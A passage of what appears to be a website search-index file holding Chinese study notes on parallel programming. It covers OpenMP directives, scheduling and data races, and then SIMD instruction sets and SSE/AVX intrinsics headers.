<li>\u7531\u4e8e\u5730\u5740\u7a7a\u95f4\u7b49\u8d44\u6e90\u9694\u79bb\uff0c\u591a\u8fdb\u7a0b\u65f6\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u6302\u6389\u5e76\u4e0d\u4f1a\u5bfc\u81f4\u6574\u4e2a\u4efb\u52a1\u6302\u6389</li> <li>\u5982\u679c\u8981\u6c42\u540c\u65f6\u8fdb\u884c\u5e76\u4e14\u53c8\u8981\u5171\u4eab\u67d0\u4e9b\u53d8\u91cf\u7684\u5e76\u53d1\u64cd\u4f5c\uff0c\u53ea\u80fd\u7528\u7ebf\u7a0b\u4e0d\u80fd\u7528\u8fdb\u7a0b</li> </ul>"},{"location":"cs/hpc/hpc101/openmp/#fork-join","title":"Fork-Join \u6a21\u578b","text":"<p>OpenMP \u7684\u5e76\u884c\u53ea\u4f7f\u7528 Fork-Join \u4e00\u79cd\u6a21\u578b</p> <p></p> <ul> <li>OpenMP \u7a0b\u5e8f\u5f00\u59cb\u4e8e\u4e00\u4e2a\u4e3b\u7ebf\u7a0b\uff0c\u6309\u7167\u987a\u5e8f\u6267\u884c\uff0c\u76f4\u5230\u9047\u5230\u7b2c\u4e00\u4e2a\u5e76\u884c\u5757</li> <li>fork\uff1a\u4e3b\u7ebf\u7a0b\u521b\u5efa\u4e00\u7ec4\u5e76\u884c\u7ebf\u7a0b</li> <li>join\uff1a\u5f53\u56e2\u961f\u7ebf\u7a0b\u5b8c\u6210\u5e76\u884c\u5757\u4e2d\u7684\u8bed\u53e5\u65f6\uff0c\u5b83\u4eec\u5c06\u8fdb\u884c\u540c\u6b65\u5e76\u7ec8\u6b62\uff0c\u53ea\u7559\u4e0b\u4e3b\u7ebf\u7a0b</li> <li>\u5e76\u884c\u5757\u7684\u6570\u91cf\u548c\u7ec4\u6210\u5b83\u4eec\u7684\u7ebf\u7a0b\u662f\u4efb\u610f\u7684</li> </ul>"},{"location":"cs/hpc/hpc101/openmp/#openmp-api","title":"OpenMP API \u7b80\u4ecb","text":""},{"location":"cs/hpc/hpc101/openmp/#_2","title":"\u8fd0\u884c\u65f6\u51fd\u6570\u5e93\u4e0e\u73af\u5883\u53d8\u91cf","text":"<p>\u4f7f\u7528\u65f6\u8981 <code>#include &lt;omp.h&gt;</code>\uff0c\u4e00\u4e9b\u5e38\u7528\u51fd\u6570\uff1a</p> <ul> <li><code>int omp_get_thread_num()</code>\uff1a\u83b7\u53d6\u5f53\u524d\u7ebf\u7a0b\u53f7</li> <li><code>int omp_get_num_threads()</code>\uff1a\u83b7\u53d6\u603b\u7ebf\u7a0b\u6570</li> <li><code>double omp_get_wtime()</code>\uff1a\u83b7\u53d6\u65f6\u95f4\uff0c\u5e38\u7528\u4e8e\u8ba1\u7b97\u7ebf\u7a0b\u5185\u8bed\u53e5\u6267\u884c\u65f6\u95f4</li> </ul> <p>OpenMP \u4f1a\u8bfb\u53d6\u73af\u5883\u53d8\u91cf OMP_NUM_THREADS \u6765\u51b3\u5b9a\u521b\u5efa\u7684\u7ebf\u7a0b\u6570</p>"},{"location":"cs/hpc/hpc101/openmp/#_3","title":"\u5e38\u89c1\u5236\u5bfc\u8bed\u53e5","text":"<p>\u4e5f\u5c31\u662f\u7f16\u8bd1\u5668\u6307\u4ee4\uff0c\u4e00\u4e9b\u5e38\u7528\u7684\uff1a</p> <ul> <li><code>#pragma omp parallel</code>\uff1a\u521b\u5efa\u5e76\u884c\u5757</li> <li><code>#pragma omp for</code>\uff1a\u5e76\u884c\u5316 for \u5faa\u73af</li> <li><code>#pragma omp master</code>\uff1a\u53ea\u6709\u4e3b\u7ebf\u7a0b\u6267\u884c</li> <li><code>#pragma omp single</code>\uff1a\u4ec5\u6709\u56e2\u961f\u4e2d\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c</li> <li><code>#pragma omp sections</code>\uff1a\u5185\u90e8\u4f7f\u7528 section \u6307\u5b9a\u4e0d\u540c\u7ebf\u7a0b\u8fd0\u884c\u7684\u5185\u5bb9</li> <li><code>#pragma omp barrier</code>\uff1a\u540c\u6b65\u56e2\u961f\u4e2d\u6240\u6709\u7ebf\u7a0b</li> <li><code>#pragma omp atomic</code>\uff1a\u539f\u5b50\u65b9\u5f0f\u8bbf\u95ee\u5185\u5b58</li> </ul>"},{"location":"cs/hpc/hpc101/openmp/#openmp_3","title":"OpenMP \u7f16\u7a0b","text":""},{"location":"cs/hpc/hpc101/openmp/#_4","title":"\u7ebf\u7a0b\u5e76\u884c","text":"<p>\u4f7f\u7528 <code>#pragma omp parallel</code> \u521b\u5efa\u5e76\u884c\u5757\u6765\u5e76\u884c\u8fd0\u884c\u540c\u4e00\u6bb5\u7a0b\u5e8f\uff1a <pre><code>#include &lt;omp.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\nint main() {\n    #pragma omp parallel\n    {\n        int ID = omp_get_thread_num();\n        printf(\"thread #%d\\n\", ID);\n    }\n}\n</code></pre> \u6b64\u65f6\u5c06\u6839\u636e OMP_NUM_THREADS \u7684\u503c\u6765\u8bbe\u5b9a\u7ebf\u7a0b\u6570\uff0c\u51e0\u70b9\u6ce8\u610f\uff1a</p> <ul> <li>\u8fd0\u884c\u65f6\u8f93\u51fa\u7684\u987a\u5e8f\u662f\u4e0d\u4e00\u5b9a\u7684</li> <li>#pragma \u8bed\u53e5\u540e\u9762\u4e0d\u80fd\u7d27\u8ddf\u7740\u5927\u62ec\u53f7\uff0c\u4e00\u5b9a\u8981\u6362\u4e00\u884c</li> <li>\u53ef\u4ee5\u901a\u8fc7\u5728 parallel \u540e\u9762\u52a0 num_threads(xx) \u6765\u6307\u5b9a\u7279\u5b9a\u7ebf\u7a0b\u6570</li> </ul>"},{"location":"cs/hpc/hpc101/openmp/#for","title":"for \u5faa\u73af\u5e76\u884c","text":"<p>parallel \u5757\u5185\u53ef\u4ee5\u4f7f\u7528 <code>#pragma omp for</code> \u6765\u5bf9 for \u5faa\u73af\u8fdb\u884c\u5e76\u884c\uff0c\u76f8\u5f53\u4e8e\u5c06\u5faa\u73af\u62c6\u6210\u4e0d\u540c\u90e8\u5206\u5206\u914d\u7ed9\u591a\u4e2a\u7ebf\u7a0b <pre><code>#pragma omp parallel\n{\n    #pragma omp for\n    {\n        for (int i = 0; i &lt; N; ++i) {\n            c[i] = a[i] + b[i];\n        }\n    }\n}\n</code></pre></p> <ul> <li>for \u5faa\u73af\u4e2d\u4e0d\u80fd\u5305\u542b break\uff08\u4f1a\u62a5\u9519\uff09\uff0c\u4e14\u5fc5\u987b\u5305\u542b \"int i = xxx\"</li> <li>parallel \u548c for \u53ef\u4ee5\u5408\u8d77\u6765\u5199\u4f5c\u4e00\u884c <code>#pragma omp parallel for</code></li> </ul>"},{"location":"cs/hpc/hpc101/openmp/#_5","title":"\u6761\u4ef6\u5e76\u884c","text":"<p>\u53ef\u4ee5\u5728\u5236\u5bfc\u8bed\u53e5\u540e\u9762\u52a0 if \u5b50\u53e5\u6765\u51b3\u5b9a\u662f\u5426\u8fdb\u884c\u5e76\u884c\uff1a <pre><code>#pragma omp parallel if(x) num_threads(4)\n{\n    ...\n} \n</code></pre></p> <ul> <li>\u5982\u679c x \u4e0d\u4e3a 0 \u5219\u5206\u4e3a\u56db\u4e2a\u7ebf\u7a0b\u6267\u884c\u5757\u5185\u5185\u5bb9</li> <li>\u5982\u679c x \u4e3a 0 \u5219\u7531\u4e3b\u7ebf\u7a0b\u4e32\u884c\u6267\u884c</li> </ul>"},{"location":"cs/hpc/hpc101/openmp/#sections-single","title":"sections \u4e0e single","text":"<p>sections \u7528\u4e8e\u5c06\u5de5\u4f5c\u62c6\u5206\u4e3a\u82e5\u5e72\u90e8\u5206\uff0c\u6bcf\u90e8\u5206\u5206\u522b\u7531\u4e0d\u540c\u7ebf\u7a0b\u8fdb\u884c\uff0c\u5b9e\u73b0\u201c\u51fd\u6570\u5e76\u884c\u5316\u201d <pre><code>#pragma omp parallel sections\n{\n    #pragma omp section\n    printf(\"%d %d\\n\", omp_get_num_threads(), omp_get_thread_num());\n    #pragma omp section\n    printf(\"%d %d\\n\", omp_get_num_threads(), omp_get_thread_num());\n}\n</code></pre></p> <ul> <li>\u6b64\u4ee3\u7801\u7684\u4e24\u4e2a printf \u5c06\u5206\u5230\u4e24\u4e2a\u7ebf\u7a0b\u4e2d\u5206\u522b\u6267\u884c</li> <li>\u9664\u975e\u4f7f\u7528\u4e86 nowait\uff0c\u5426\u5219\u9ed8\u8ba4 sections \u4e3a barrier\uff08\u7ebf\u7a0b\u4e4b\u95f4\u4f1a\u4e92\u76f8\u7b49\u5f85\uff09</li> </ul> <p>single \u7528\u6765\u5e8f\u5217\u5316\u4e00\u6bb5\u4ee3\u7801\uff0c\u5373\u5728\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u6267\u884c\uff08\u5904\u7406\u975e\u7ebf\u7a0b\u5b89\u5168\u7684\u4ee3\u7801\uff0c\u4f8b\u5982 IO\uff09</p>"},{"location":"cs/hpc/hpc101/openmp/#_6","title":"\u4efb\u52a1\u8c03\u5ea6","text":"<p>OpenMP \u4e2d\u4efb\u52a1\u8c03\u5ea6\u4e3b\u8981\u7528\u4e8e\u5e76\u884c\u7684 for \u5faa\u73af\uff0c\u5f53\u5faa\u73af\u4e2d\u6bcf\u6b21\u8fed\u4ee3\u7684\u8ba1\u7b97\u91cf\u4e0d\u76f8\u7b49\u65f6\uff0c\u4f1a\u9020\u6210\u67d0\u4e9b\u7ebf\u7a0b\u7a7a\u95f2\uff0c\u6ca1\u6709\u4f7f\u6027\u80fd\u6700\u5927\u5316</p> <p>OpenMP \u7684\u4efb\u52a1\u8c03\u5ea6\u65b9\u5f0f\u6709\u4e09\u79cd\uff1astatic\u3001dynamic\u3001guide\uff0c\u4f7f\u7528 schedule \u5b50\u53e5\u6307\u5b9a\uff1a</p> <ul> <li>static\uff1a\u9ed8\u8ba4\u60c5\u51b5\uff0c\u76f4\u63a5\u6309\u7167\u8fed\u4ee3\u6b21\u6570\u5206\u914d</li> <li>dynamic\uff1a\u5c06\u4efb\u52a1\u5206\u914d\u5230\u6bcf\u4e2a\u6838\u5fc3\uff0c\u6709\u6838\u5fc3\u7a7a\u95f2\u4e86\u5c31\u63a5\u7740\u5206\u914d\u3002\u5982\u679c\u6307\u5b9a size \u4e3a 2 \u5c31\u4f1a\u6bcf\u4e00\u6b21\u4e3a\u6bcf\u4e00\u4e2a\u6838\u5fc3\u8fde\u7eed\u5206\u914d\u4e24\u4e2a\u4efb\u52a1     <pre><code>#pragma omp parallel for num_threads(4) schedule(dynamic, 2)\nfor (int i = 0; i &lt; 10; ++i) {\n    ...\n}\n</code></pre></li> <li>guided\uff1a\u91c7\u7528\u6307\u5bfc\u6027\u7684\u542f\u53d1\u5f0f\u81ea\u8c03\u5ea6\u65b9\u5f0f\u3002\u5f00\u59cb\u65f6\u6bcf\u4e2a\u7ebf\u7a0b\u4f1a\u5206\u914d\u5230\u8f83\u5927\u7684\u8fed\u4ee3\u5757\uff0c\u4e4b\u540e\u5206\u914d\u5230\u7684\u8fed\u4ee3\u5757\u4f1a\u9010\u6e10\u9012\u51cf\uff0c\u6309\u6307\u6570\u7ea7\u4e0b\u964d\u5230\u6307\u5b9a\u7684 size \u5927\u5c0f\uff0c\u6ca1\u6709\u6307\u5b9a size \u5219\u4f1a\u4e0b\u964d\u5230 1     <pre><code>#pragma omp parallel for num_threads(4) schedule(guided, 2)\nfor (int i = 0; i &lt; 100; ++i) {\n    ...\n}\n</code></pre></li> </ul>"},{"location":"cs/hpc/hpc101/openmp/#_7","title":"\u6570\u636e\u5192\u9669","text":"<p>OpenMP \u4e2d\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u81ea\u5df1\u7684 Local Memory\uff0c\u4f46\u9ed8\u8ba4\u4e0a\u5e76\u884c\u5757\u5916\u7684\u53d8\u91cf\u90fd\u662f\u5171\u4eab\u7684\uff0c\u5171\u4eab\u7684\u5b58\u50a8\u5728\u7ebf\u7a0b\u4e2d\u540c\u65f6\u8bfb\u5199\u65f6\u4f1a\u51fa\u73b0\u95ee\u9898</p>"},{"location":"cs/hpc/hpc101/openmp/#_8","title":"\u53d8\u91cf\u79c1\u6709","text":"<p>\u53ef\u4ee5\u5229\u7528 private \u5b50\u53e5\u6765\u58f0\u660e x \u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u79c1\u6709\u7684\u53d8\u91cf\uff1a <pre><code>int x;\n#pragma omp parallel for private(x)\nfor (int i = 0; i &lt; 100; ++i) {\n    x = array[i];\n    array[i] = work(x);\n}\n</code></pre></p> <ul> <li>\u6b64\u65f6\u5bf9\u4e8e x \u7684\u8bbf\u95ee\u5c31\u4e0d\u4f1a\u4ea7\u751f\u51b2\u7a81</li> <li>\u4f46\u5728\u7a0b\u5e8f\u4e2d\u5e94\u8be5\u5047\u5b9a\u6bcf\u4e2a\u7ebf\u7a0b\u5185\u7684 x \u90fd\u6ca1\u6709\u88ab\u521d\u59cb\u5316\uff08\u5373\u6bcf\u4e2a\u7ebf\u7a0b\u4e2d x \u6700\u5f00\u59cb\u90fd\u662f\u968f\u673a\u7684\uff09</li> <li>\u4e5f\u6709 shared(x) \u5b50\u53e5\uff0c\u8fd9\u56de\u4f7f\u6240\u6709\u7ebf\u7a0b\u8bbf\u95ee\u540c\u4e00\u4e2a\u5730\u5740\u7a7a\u95f4</li> <li>x \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728\u5e76\u884c\u5757\u5185\u58f0\u660e</li> <li>\u53ef\u4ee5\u5229\u7528 firstprivate \u548c lastprivate \u5b50\u53e5\u6765\u5b9e\u73b0\u81ea\u52a8\u521d\u59cb\u5316</li> </ul>"},{"location":"cs/hpc/hpc101/openmp/#_9","title":"\u539f\u5b50\u64cd\u4f5c","text":"<ul> <li>\u591a\u4e2a\u7ebf\u7a0b\u5728\u76f8\u8fd1\u7684\u65f6\u95f4\u6bb5\u5185\u5bf9\u5171\u4eab\u7684\u53d8\u91cf\u8fdb\u884c\u66f4\u65b0\uff0c\u5c31\u4f1a\u4ea7\u751f\u6570\u636e\u4e0d\u4e00\u81f4\u7684\u95ee\u9898</li> <li>\u539f\u5b50\u64cd\u4f5c\u53ef\u4ee5\u4fdd\u8bc1\u66f4\u65b0\u64cd\u4f5c\u4e0d\u53ef\u518d\u5206</li> </ul> <p>\u4f8b\u5982\uff1a <pre><code>int counter = 0;\n#pragma omp parallel num_threads(4) shared(counter)\n{\n    for (int i = 0; i &lt; 1000000; ++i) {\n        counter += 1;\n    }\n}\n</code></pre> \u8fd9\u65f6\u6240\u6709\u7ebf\u7a0b\u90fd\u4f1a\u5bf9 counter \u8fdb\u884c\u8bfb\u5199\uff0c\u4f1a\u9020\u6210\u7ade\u4e89\uff0c\u53ef\u80fd\u5bfc\u81f4\u6700\u7ec8\u7684\u7ed3\u679c\u4e0d\u6b63\u786e</p> <p>\u5728 counter += 1 \u4e00\u884c\u4e0a\u9762\u52a0\u4e0a <code>#pragma omp atomic</code> \u53ef\u4ee5\u4f7f\u8fd9\u5355\u4e2a\u8bed\u53e5\u5728\u6c47\u7f16\u5c42\u9762\u4e0a\u539f\u5b50\u5316\uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u201c\u52a0\u9501\u201d\u4e86\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u9020\u6210\u8bfb\u5199\u7684\u51b2\u7a81</p>"},{"location":"cs/hpc/hpc101/openmp/#reduction","title":"reduction","text":"<p>reduction \u5b50\u53e5\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u521b\u5efa\u5e76\u79c1\u6709\u5316\u6307\u5b9a\u53d8\u91cf\u7684\u79c1\u6709\u526f\u672c\uff0c\u7136\u540e\u5728\u5e76\u884c\u7ed3\u675f\u4e4b\u540e\u5c06\u4e0d\u540c\u7ebf\u7a0b\u7684\u7ed3\u679c\u5408\u5e76\u4e3a\u4e00\u4e2a\uff0c\u4f8b\u5982\uff1a <pre><code>int sum = 0;\n#pragma omp parallel for reduction(+: sum)\nfor (int i = 0; i &lt; 1000; ++i) {\n    sum += 1;\n}\n</code></pre></p>"},{"location":"cs/hpc/hpc101/openmp/#barrier","title":"barrier","text":"<ul> <li>\u6bcf\u4e2a\u5e76\u884c\u5757\u90fd\u542b\u6709\u9690\u5f0f\u7684 barrier\uff0c\u4e5f\u5c31\u662f\u5728\u6240\u6709\u7ebf\u7a0b\u90fd\u7ed3\u675f\u540e\u624d\u80fd\u7ee7\u7eed\u5411\u4e0b\u8fd0\u884c</li> <li>\u5728\u5e76\u884c\u5757\u5185\u4e5f\u53ef\u4ee5\u5229\u7528 <code>#pragma omp barrier</code> \u6765\u540c\u6b65\u5404\u7ebf\u7a0b\uff0c\u5373\u6240\u6709\u7ebf\u7a0b\u90fd\u89e6\u78b0\u5230 barrier \u65f6\u518d\u7ee7\u7eed</li> <li>\u53ef\u4ee5\u5229\u7528 nowait \u5b50\u53e5\u6765\u53d6\u6d88\u5e76\u884c\u5757\u7ed3\u5c3e\u7684\u9690\u5f0f barrier\uff0c\u907f\u514d\u540c\u6b65\u4ea7\u751f\u7684\u5f00\u9500</li> </ul>"},{"location":"cs/hpc/hpc101/vectorized/","title":"\u5411\u91cf\u5316\u8ba1\u7b97","text":"<p> \u7ea6 1699 \u4e2a\u5b57  2 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u4e8c\u6b21\u5b9e\u9a8c\u5185\u5bb9</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe PPT</li> <li>NumPy documentation</li> <li>NumPy Illustrated: The Visual Guide to NumPy</li> <li>Intel Intrinsics Guide</li> <li>SIMD \u7b80\u4ecb - \u77e5\u4e4e</li> <li>\u4ece Eigen \u5411\u91cf\u5316\u8c08\u5185\u5b58\u5bf9\u9f50 - \u77e5\u4e4e</li> </ul>"},{"location":"cs/hpc/hpc101/vectorized/#numpy","title":"NumPy \u57fa\u7840","text":"<p>\u8be6\u89c1 Computer Science &gt; \u7f16\u7a0b\u8bed\u8a00 &gt; Python &gt; NumPy</p>"},{"location":"cs/hpc/hpc101/vectorized/#simd","title":"SIMD","text":"<p>\u5355\u6307\u4ee4\u591a\u6570\u636e\u6d41\uff08Single Instruction Multiple Data\uff09\uff0c\u5728\u786c\u4ef6\u5c42\u9762\u4e0a\u63d0\u4f9b\u4e86\u901a\u8fc7\u4e00\u6761\u6307\u4ee4\u8fd0\u884c\u591a\u4e2a\u8fd0\u7b97\u7684\u65b9\u6cd5</p> <p>\u5728 x86 \u67b6\u6784\u4e0b\uff0cSIMD \u4e00\u534a\u548c SSE \u548c AVX \u7b49\u6307\u4ee4\u96c6\u8054\u7cfb\u5728\u4e00\u8d77\uff0cSSE \u548c AVX \u6307\u4ee4\u96c6\u4e2d\u63d0\u4f9b\u4e86\u5927\u91cf\u53ef\u4ee5\u5355\u6307\u4ee4\u64cd\u4f5c\u591a\u4e2a\u6570\u636e\u5355\u5143\u7684\u6307\u4ee4</p> <p>SIMD \u76f4\u89c9\u4e0a\u53ef\u4ee5\u6781\u5927\u5730\u63d0\u5347\u6548\u7387\uff0c\u4f46\u5b9e\u9645\u60c5\u51b5\u6bd4\u8f83\u590d\u6742\uff0c\u6bd4\u5982\u5185\u5b58\u5e26\u5bbd\u4f7f\u7528\u3001\u89e3\u7801\u6d88\u8017\u7b49\uff0c\u9700\u8981\u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790\uff0c\u5e76\u4e0d\u4ee3\u8868\u53ef\u4ee5\u540c\u65f6\u64cd\u4f5c\u4e24\u4e2a\u6570\u636e\uff0c\u52a0\u901f\u6bd4\u5c31\u662f 2</p>"},{"location":"cs/hpc/hpc101/vectorized/#simd_1","title":"SIMD \u57fa\u7840","text":""},{"location":"cs/hpc/hpc101/vectorized/#_2","title":"\u53d1\u5c55\u7b80\u53f2","text":"<p>1996 \u5e74 Intel \u63a8\u51fa\u4e86 x86 \u7684 MMX\uff08MultiMedia eXtension\uff09\u6307\u4ee4\u96c6\u6269\u5c55\uff0cMMX \u5b9a\u4e49\u4e86 8 \u4e2a MM \u5bc4\u5b58\u5668\uff0c\u79f0\u4e3a MM0 \u5230 MM7\uff0c\u4ee5\u53ca\u5bf9\u8fd9\u4e9b\u5bc4\u5b58\u5668\u8fdb\u884c\u64cd\u4f5c\u7684\u6307\u4ee4\u3002\u6bcf\u4e2a\u5bc4\u5b58\u5668\u4e3a 64 \u4f4d\u5bbd\uff0c\u53ef\u7528\u4e8e\u4ee5\u201c\u538b\u7f29\u201d\u683c\u5f0f\u4fdd\u5b58 64 \u4f4d\u6574\u6570\u6216\u591a\u4e2a\u8f83\u5c0f\u6574\u6570\uff0c\u7136\u540e\u53ef\u4ee5\u5c06\u5355\u4e2a\u6307\u4ee4\u4e00\u6b21\u5e94\u7528\u4e8e\u4e24\u4e2a 32 \u4f4d\u6574\u6570\uff0c\u56db\u4e2a 16 \u4f4d\u6574\u6570\u6216\u516b\u4e2a 8 \u4f4d\u6574\u6570</p> <p>Intel \u5728 1999 \u5e74\u53c8\u63a8\u51fa\u4e86\u5168\u9762\u8986\u76d6 MMX \u7684 SSE\uff08Streaming SIMD Extensions\uff0c\u6d41\u5f0f SIMD \u6269\u5c55\uff09\u6307\u4ee4\u96c6\uff0cSSE \u6dfb\u52a0\u4e86 8 \u4e2a\u65b0\u7684 128 \u4f4d\u5bc4\u5b58\u5668\uff0cXMM0 \u5230XMM7\uff0c\u800c\u540e\u6765\u7684 x86_64 \u6269\u5c55\u53c8\u5728\u539f\u6765\u7684\u57fa\u7840\u4e0a\u6dfb\u52a0\u4e86 8 \u4e2a\u5bc4\u5b58\u5668\uff0cXMM8 \u5230 XMM15\u3002SSE \u652f\u6301\u5355\u4e2a\u5bc4\u5b58\u5668\u5b58\u50a8 4 \u4e2a 32 \u4f4d\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c\u4e4b\u540e\u7684 SSE2 \u5219\u652f\u6301\u5355\u4e2a\u5bc4\u5b58\u5668\u5b58\u50a8 2 \u4e2a 64 \u4f4d\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c2 \u4e2a 64 \u4f4d\u6574\u6570\u6216 4 \u4e2a 32 \u4f4d\u6574\u6570\u6216 8 \u4e2a 16 \u4f4d\u77ed\u6574\u5f62\u3002SSE2 \u4e4b\u540e\u8fd8\u6709 SSE3\uff0cSSE4 \u4ee5\u53ca AVX\uff0cAVX2 \u7b49\u6269\u5c55\u6307\u4ee4\u96c6</p> <p>AVX \u5f15\u5165\u4e86 16 \u4e2a 256 \u4f4d\u5bc4\u5b58\u5668\uff0cYMM0 \u81f3 YMM15\uff0cAVX \u7684 256 \u4f4d\u5bc4\u5b58\u5668\u548c SSE \u7684 128 \u4f4d\u5bc4\u5b58\u5668\u5b58\u5728\u7740\u76f8\u4e92\u91cd\u53e0\u7684\u5173\u7cfb\uff08XMM \u5bc4\u5b58\u5668\u4e3a YMM \u5bc4\u5b58\u5668\u7684\u4f4e 128\u4f4d\uff0c\u7c7b\u4f3c 8086 \u4e2d\u7684 ax \u4e0e al\uff09\u3002AVX256 \u652f\u6301\u5728\u4e00\u4e2a YMM \u5bc4\u5b58\u5668\u4e2d\u5b58\u50a8 8 \u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6216 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570</p> <p>AVX512 \u589e\u52a0\u4e86 512 \u4f4d\u5bc4\u5b58\u5668\u548c\u76f8\u5173\u64cd\u4f5c\uff0c\u4f46\u662f\u6548\u7387\u4e0d\u9ad8\u3001\u4f1a\u4f7f\u5904\u7406\u5668\u53d1\u70ed\u4e25\u91cd\u3001\u4ee5\u53ca\u5f88\u53ef\u80fd\u4f1a\u51fa\u73b0\u8d1f\u4f18\u5316\uff0c\u6240\u4ee5\u4e00\u822c\u4e0d\u4f7f\u7528</p> <p>Linux \u53ef\u4ee5\u901a\u8fc7 cat /proc/cpuinfo \u6765\u67e5\u770b CPU \u652f\u6301\u7684\u6307\u4ee4\u96c6\uff0cmacOS \u53ef\u4ee5\u901a\u8fc7 sysctl -a | grep machdep.cpu.features \u6765\u67e5\u770b</p>"},{"location":"cs/hpc/hpc101/vectorized/#simd_2","title":"SIMD \u4f7f\u7528\u65b9\u6cd5","text":"<p>\u6709\u5f88\u591a\u79cd\u4f7f\u7528 SIMD \u7684\u65b9\u6cd5\uff0c\u4ece\u9876\u5c42\u5230\u5e95\u5c42\u4f9d\u6b21\u662f\uff1a</p> <ul> <li>\u4f7f\u7528 Intel \u5f00\u53d1\u7684\u8de8\u5e73\u53f0\u51fd\u6570\u5e93\uff08IPP\uff0cIntel Integrated Performance Primitives\uff09\uff0c\u91cc\u9762\u7684\u6307\u4ee4\u662f\u4f7f\u7528 SIMD \u4f18\u5316\u8fc7\u7684</li> <li>\u81ea\u52a8\u5411\u91cf\u5316\uff08Auto-vectorization\uff09\uff0c\u7531\u7f16\u8bd1\u5668\u5c06\u6807\u91cf\u4f18\u5316\u4e3a\u5411\u91cf\u64cd\u4f5c</li> <li>\u4f7f\u7528\u7f16\u8bd1\u5668\u6307\u793a\u7b26\uff08Compiler directive\uff09\uff0c\u5373\u4f7f\u7528 #progma simd \u5f3a\u5236\u5faa\u73af\u5411\u91cf\u5316</li> <li>\u4f7f\u7528\u5185\u7f6e\u51fd\u6570\uff08Intrinsics\uff09\uff0cIntel \u63d0\u4f9b\u7684\u4e00\u4e9b\u6307\u4ee4\u7684\u5305\u88c5</li> <li>\u76f4\u63a5\u7f16\u5199\u6c47\u7f16\u4ee3\u7801</li> </ul> <p>\u624b\u5199 SIMD \u4e00\u822c\u4f7f\u7528 Intrinsics \u6765\u5b9e\u73b0</p> <p>\u7b80\u5355\u60c5\u51b5\u4e0b\u6ca1\u6709\u5fc5\u8981\u624b\u5199\uff0c\u901a\u8fc7 -O3 -mavx2 \u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u4f18\u5316\u5730\u5f88\u597d\u3002\u4f46\u5982\u679c\u4ee3\u7801\u7ed3\u6784\u590d\u6742\uff0c\u5faa\u73af\u96be\u4ee5\u754c\u5b9a\u8fb9\u754c\uff0c\u751a\u81f3\u8fd8\u6709\u5206\u652f\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5c31\u9700\u8981\u624b\u5199 SIMD</p>"},{"location":"cs/hpc/hpc101/vectorized/#sseavx-intrinsics","title":"SSE/AVX Intrinsics","text":""},{"location":"cs/hpc/hpc101/vectorized/#_3","title":"\u5934\u6587\u4ef6","text":"<p>\u63d0\u4f9b\u8fd9\u4e9b intrinsics \u7684\u5934\u6587\u4ef6\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 ?mmintrin.h \u6765\u5bfc\u5165\uff0c\u4e0d\u540c\u6307\u4ee4\u96c6\u7684\u5934\u6587\u4ef6\u4e0d\u540c\uff1a</p> <ul> <li><code>xmmintrin.h</code>\uff1aSSE\uff0c\u652f\u6301\u540c\u65f6\u5bf9 4 \u4e2a 32 \u4f4d\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684\u64cd\u4f5c</li> <li><code>emmintrin.h</code>\uff1aSSE 2\uff0c\u652f\u6301\u540c\u65f6\u5bf9 2 \u4e2a 64 \u4f4d\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684\u64cd\u4f5c</li> <li><code>pmmintrin.h</code>\uff1aSSE 3\uff0c\u652f\u6301\u5bf9 SIMD \u5bc4\u5b58\u5668\u7684\u6c34\u5e73\u64cd\u4f5c\uff08horizontal operation\uff09\uff0c\u5982 hadd, hsub \u7b49...</li> <li><code>tmmintrin.h</code>\uff1aSSSE 3\uff0c\u589e\u52a0\u4e86\u989d\u5916\u7684 instructions</li> <li><code>smmintrin.h</code>\uff1aSSE 4.1\uff0c\u652f\u6301\u70b9\u4e58\u4ee5\u53ca\u66f4\u591a\u7684\u6574\u5f62\u64cd\u4f5c</li> <li><code>nmmintrin.h</code>\uff1aSSE 4.2\uff0c\u589e\u52a0\u4e86\u989d\u5916\u7684 instructions</li> <li><code>immintrin.h</code>\uff1aAVX\uff0c\u652f\u6301\u540c\u65f6\u64cd\u4f5c 8 \u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6216 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570</li> </ul> <p>\u800c\u4e14\u540e\u9762\u7684\u5934\u6587\u4ef6\u5305\u542b\u524d\u9762\u6240\u6709\u7684\u5185\u5bb9</p>"},{"location":"cs/hpc/hpc101/vectorized/#_4","title":"\u6570\u636e\u7c7b\u578b","text":"<p>\u989d\u5916\u6570\u636e\u7c7b\u578b\u4ee5 __mxxx[T] \u7684\u5f62\u5f0f\u547d\u540d\uff1a</p> <ul> <li>xxx\uff1a\u5b58\u50a8\u6570\u636e\u7684\u603b\u4f4d\u6570\uff0c\u6bd4\u5982 128\u3001256</li> <li>[T]\uff1a\u5b58\u50a8\u7684\u6bcf\u4e2a\u5355\u5143\u7684\u7c7b\u578b\uff0c\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7701\u7565\uff0c\u6574\u578b\u4e3a i\uff0c\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u4e3a 